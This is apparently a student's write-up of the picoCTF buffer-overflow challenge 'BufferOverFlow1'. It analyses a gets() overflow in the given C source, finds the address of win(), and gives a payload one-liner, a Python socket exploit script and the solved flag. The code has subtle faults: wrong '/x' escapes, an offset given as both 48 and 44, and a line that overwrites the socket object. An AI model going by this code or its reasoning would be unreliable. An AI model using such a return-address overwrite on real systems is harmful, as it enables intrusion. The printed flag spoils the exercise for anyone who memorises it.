# BufferOverFlow1
link challenge: https://play.picoctf.org/practice/challenge/258?category=6&page=2

## Description
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here.

## Solution
get the given file:

    wget https://artifacts.picoctf.net/c/185/vuln https://artifacts.picoctf.net/c/185/vuln
    wget https://artifacts.picoctf.net/c/185/vuln https://artifacts.picoctf.net/c/185/vuln.c

if we run the program with:

    chmod +x vuln
    ./vuln


the program will ask for a string. 

    Please enter your string: 

let's take a step back, we start with analysing the vuln.c source code.

first the BUFSIZE, from it we can consider that the offset maybe 32 or even more.

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include "asm.h"

    #define BUFSIZE 32
    #define FLAGSIZE 64



    void win() {
      char buf[FLAGSIZE];
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
        exit(0);
      }

      fgets(buf,FLAGSIZE,f);
      printf(buf);
    }

    void vuln(){
      char buf[BUFSIZE];
      gets(buf);

      printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
    }

    int main(int argc, char **argv){

      setvbuf(stdout, NULL, _IONBF, 0);
  
      gid_t gid = getegid();
      setresgid(gid, gid, gid);

      puts("Please enter your string: ");
      vuln();
      return 0;
    }

from these three functions, we can know that:
-  function win() is the function that will give us the flag
-  vuln() function seems there's an interesting one

       gets(buf);.  that's where the we will get the buffer
   
-  main() function we can know that is call vuln() function after we input a value
-  the end, we know that we can get the buffer by entering some payload while inputing the value

## exploitation step
before inputing some string to the program we must know the number of offset length is.
if we enter 32 A:

    python -c "print('A' * 32)" 

we'll get nothing strange, but if we entered the string length until 48 we'll get a segmentation fault.

    python -c "print('A' * 48)"

the program will crash and give us:
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python -c "print('A' * 48)" | 
zsh: segmentation fault  ./vuln

from this, we know the offset length is 48.

if we analyze the 0x41414141 too, it's a hex number of "AAAA". so the program are jumping to the "AAAA" adresss.

what if we make the program to jump to the win() function address??
so, we must find the address of the win() function with "readelf" tools

the command to see the address function of vuln file is

    readelf -s ./vuln

-s for displaying the symbols table of the file

the output will given us the win() function address: 
    
    080491f6   139 FUNC    GLOBAL DEFAULT   13 win

080491f6 is the address, and don't forget that the address is in the hex number.

if we want to reach the win() function we must input 44 characters and the address of win 080491f6. but we must convert the address of win() to the 
little-endian format first:
/xf6/x91/x04/x08

so, let's execute it with the command:
python -c "print('A' * 44 + '/xf6/x91/x04/x08')" | nc saturn.picoctf.net 62768

but, the flag still doesn't show up.

so, i write a script to exploit this

    #!/usr/bin/env python3
    
    import argparse
    import socket
    import struct

    parser = argparse.ArgumentParser()
    parser.add_argument(
            "host",
            type=str,
            help="host name or ip adress to connect"
            )

    parser.add_argument(
            "port",
            type=int,
            help="port number to connect"
            )

    args = parser.parse_args()

    offset = 44

    new_address = struct.pack("<I", 0x080491f6)

    payload = b"".join(
        [
        b"A" * offset,
        new_address
        ]
    )

    payload += b"\n"

    print(args.host, args.port)

    with socket.socket() as connection:
        connection = socket.socket

        connection.connect((args.host, args.port))
        connection.recv(4096).decode("utf-8")
        connection.send(payload)
        connection.recv(4096).decode("utf-8")
        connection.recv(4096).decode("utf-8")

if we exploit this code with the command: 

    python exploit.py saturn.picoctf.net 62768 

the program will gives us the flag:

    picoCTF{addr3ss3s_ar3_3asy_6462ca2d}



